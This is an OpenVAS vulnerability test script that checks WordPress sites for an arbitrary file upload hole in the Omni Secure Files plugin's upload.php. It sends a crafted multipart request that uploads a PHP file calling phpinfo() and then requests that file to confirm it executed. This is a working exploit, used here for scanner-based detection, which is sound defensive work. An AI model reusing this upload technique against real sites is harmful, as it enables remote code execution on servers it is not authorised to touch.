##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_omni_sec_files_file_upload_vuln.nasl 11357 2018-09-12 10:57:05Z asteins $
#
# Wordpress Omni Secure Files Plugin 'upload.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802641");
  script_version("$Revision: 11357 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-12 12:57:05 +0200 (Wed, 12 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-06-12 12:12:12 +0530 (Tue, 12 Jun 2012)");
  script_name("Wordpress Omni Secure Files Plugin 'upload.php' Arbitrary File Upload Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/49441");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/76121");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19009");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/113411/wpomnisecure-shell.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload arbitrary PHP
code and run it in the context of the Web server process.");
  script_tag(name:"affected", value:"Wordpress Omni Secure Files Plugin version 0.1.13");
  script_tag(name:"insight", value:"The flaw is due to the wp-content/plugins/omni-secure-files/plupload/
examples/upload.php script improperly verifying uploaded files. This can be
exploited to execute arbitrary PHP code by uploading a malicious PHP script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running WordPress Omni Secure Files Plugin and is
prone to file upload vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

host = http_host_name(port:port);

rand = rand();
file =  "ovtest" + rand + ".php";
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 328;
url = string(dir, "/wp-content/plugins/omni-secure-files/plupload/examples/",
             "upload.php");
req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", host, "\r\n",
      "Content-Type: multipart/form-data; boundary=----------------------------b5d63781e685\r\n",
      "Content-Length: ", len, "\r\n\r\n",
      "------------------------------b5d63781e685\r\n",
      'Content-Disposition: form-data; name="file"; filename="',file,'";',"\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      ex, "\r\n",
      "------------------------------b5d63781e685\r\n",
      'Content-Disposition: form-data; name="name"',"\r\n",
      "\r\n",
      file, "\r\n",
      "------------------------------b5d63781e685--\r\n\r\n");
res = http_keepalive_send_recv(port: port, data: req);

if(res && res =~ "HTTP/1.. 200")
{
  url =  string(dir, "/wp-content/plugins/omni-secure-files/plupload/",
                "examples/uploads/", file);

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<title>phpinfo\(\)", extra_check:rand))
  {
    security_message(port:port);
    exit(0);
  }
}
